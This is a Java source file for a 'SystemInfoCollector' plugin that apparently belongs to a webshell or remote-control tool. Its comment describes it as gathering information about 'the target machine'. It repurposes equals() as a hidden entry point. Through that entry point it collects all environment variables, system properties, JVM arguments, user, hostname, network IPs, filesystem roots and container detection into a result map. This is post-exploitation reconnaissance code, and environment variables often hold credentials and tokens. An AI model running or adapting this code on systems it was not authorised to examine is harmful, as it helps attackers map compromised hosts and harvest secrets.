package com.reajason.noone.plugin;

import java.io.File;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.RuntimeMXBean;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.*;

/**
 * System information collector.
 * Used to retrieve basic information about the target machine.
 */
public class SystemInfoCollector {

    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Map)) {
            return true;
        }
        Map<String, Object> systemInfo = new HashMap<String, Object>();
        try {
            systemInfo.put("os", getOs());
            systemInfo.put("runtime", getRuntime());
            systemInfo.put("env", getEnv());
            systemInfo.put("process", getProcess());
            systemInfo.put("network", getNetwork());
            systemInfo.put("file_systems", getFileSystem());
        } catch (Exception e) {
            systemInfo.put("error", "Failed to collect system info: " + e.getMessage());
        }

        Map<String, Object> map = (Map<String, Object>) obj;
        map.put("result", systemInfo);
        return true;
    }

    private static Map<String, Object> getOs() {
        Map<String, Object> result = new HashMap<>();
        result.put("name", System.getProperty("os.name"));
        result.put("version", System.getProperty("os.version"));
        result.put("arch", System.getProperty("os.arch"));
        result.put("platform_type", getPlatformType());
        try {
            result.put("hostname", InetAddress.getLocalHost().getHostName());
        } catch (Exception e) {
            result.put("hostname", "unknown");
        }
        return result;
    }

    private static Map<String, Object> getProcess() {
        Map<String, Object> info = new HashMap<>();
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        String name = runtimeMXBean.getName();
        info.put("pid", name.split("@")[0]);
        info.put("start_time", new Date(runtimeMXBean.getStartTime()).toString());
        info.put("uptime_ms", runtimeMXBean.getUptime());
        info.put("user", System.getProperty("user.name"));
        info.put("cwd", System.getProperty("user.dir"));
        info.put("tmp_dir", System.getProperty("java.io.tmpdir"));
        info.put("argv", runtimeMXBean.getInputArguments());
        return info;
    }

    private static Map<String, Object> getRuntime() {
        Map<String, Object> info = new HashMap<>();
        info.put("type", "java");
        info.put("version", System.getProperty("java.version"));
        info.put("mem", getJvmMem());
        info.put("system_props", getSystemProperties());
        info.put("current_stacks", getCurrentThreadStack());
        return info;
    }

    private static List<Map<String, Object>> getFileSystem() {
        File[] roots = File.listRoots();
        List<Map<String, Object>> fileSystemInfo = new ArrayList<Map<String, Object>>();
        for (File root : roots) {
            Map<String, Object> fsInfo = new HashMap<String, Object>();
            fsInfo.put("path", root.getAbsolutePath());
            fsInfo.put("total_space", root.getTotalSpace());
            fsInfo.put("free_space", root.getFreeSpace());
            fsInfo.put("usable_space", root.getUsableSpace());
            fileSystemInfo.add(fsInfo);
        }
        return fileSystemInfo;
    }

    private static Object getNetwork() {
        try {
            List<Map<String, Object>> interfaces = new ArrayList<Map<String, Object>>();
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface ni = networkInterfaces.nextElement();
                if (!ni.isUp()) continue;
                Map<String, Object> niInfo = new HashMap<String, Object>();
                niInfo.put("name", ni.getName());
                List<String> ips = new ArrayList<>();
                Enumeration<InetAddress> inetAddresses = ni.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress addr = inetAddresses.nextElement();
                    ips.add(addr.getHostAddress());
                }
                Collections.reverse(ips);
                StringBuilder ipsBuilder = new StringBuilder();
                for (String ip : ips) {
                    ipsBuilder.append(ip).append(",");
                }
                niInfo.put("ips", ipsBuilder.substring(0, ipsBuilder.length() - 1));
                interfaces.add(niInfo);
            }
            Collections.reverse(interfaces);
            return interfaces;
        } catch (Exception e) {
            Map<String, Object> error = new HashMap<String, Object>();
            error.put("error", "Failed to collect system info: " + e.getMessage());
            return error;
        }
    }

    private static String getPlatformType() {
        if (new File("/.dockerenv").exists()) {
            return "docker";
        }
        if (System.getenv("KUBERNETES_SERVICE_HOST") != null) {
            return "k8s";
        }
        if (new File("/var/run/secrets/kubernetes.io").exists()) {
            return "k8s";
        }
        return "host";
    }

    private static Map<String, String> getEnv() {
        try {
            return System.getenv();
        } catch (Exception e) {
            return new HashMap<String, String>();
        }
    }


    private static Map<String, String> getSystemProperties() {
        Map<String, String> properties = new HashMap<String, String>();
        try {
            Properties sysProps = System.getProperties();
            for (String key : sysProps.stringPropertyNames()) {
                properties.put(key, sysProps.getProperty(key));
            }
        } catch (Exception e) {
            properties.put("error", "Failed to get system properties: " + e.getMessage());
        }
        return properties;
    }

    private static Map<String, Object> getJvmMem() {
        Map<String, Object> info = new HashMap<>();
        MemoryMXBean memoryMXBean = ManagementFactory.getMemoryMXBean();
        java.lang.management.MemoryUsage heapMemoryUsage = memoryMXBean.getHeapMemoryUsage();
        java.lang.management.MemoryUsage nonHeapMemoryUsage = memoryMXBean.getNonHeapMemoryUsage();
        if (heapMemoryUsage == null || nonHeapMemoryUsage == null) {
            return info;
        }
        try {
            long heapUsed = heapMemoryUsage.getUsed();
            long nonHeapUsed = nonHeapMemoryUsage.getUsed();
            long used = heapUsed == -1 || nonHeapUsed == -1 ? -1 : heapUsed + nonHeapUsed;
            long heapMax = heapMemoryUsage.getMax() == -1 ? heapMemoryUsage.getCommitted() : heapMemoryUsage.getMax();
            long noHeapMax = nonHeapMemoryUsage.getMax() == -1 ? nonHeapMemoryUsage.getCommitted() :
                    nonHeapMemoryUsage.getMax();
            long max = heapMax == -1 || noHeapMax == -1 ? -1 : heapMax + noHeapMax;
            double usage = -1;
            if (used != -1 && max != -1) {
                usage = Math.round((double) used / max * 10000) / 100.0;
            }
            info.put("heap_used", heapUsed);
            info.put("heap_max", heapMax);
            info.put("nonheap_used", nonHeapUsed);
            info.put("nonheap_max", noHeapMax);
            info.put("max", max);
            info.put("usage", usage);
            if (heapUsed == -1 && nonHeapUsed == -1 && heapMax == -1 && noHeapMax == -1) {
                return null;
            }
            return info;
        } catch (Throwable ignored) {
        }
        return info;
    }

    public static List<String> getCurrentThreadStack() {
        List<String> stackTrace = new ArrayList<String>();
        try {
            Thread currentThread = Thread.currentThread();
            StackTraceElement[] elements = currentThread.getStackTrace();
            boolean skip = true;
            for (StackTraceElement element : elements) {
                if (skip) {
                    String className = element.getClassName();
                    if (className.equals(SystemInfoCollector.class.getName())
                            || className.startsWith("java")
                            || className.startsWith("sun")) {
                        continue;
                    }
                    skip = false;
                }
                stackTrace.add(element.toString());
            }
        } catch (Exception e) {
            stackTrace.add("Failed to get stack trace: " + e.getMessage());
        }
        return stackTrace;
    }
}
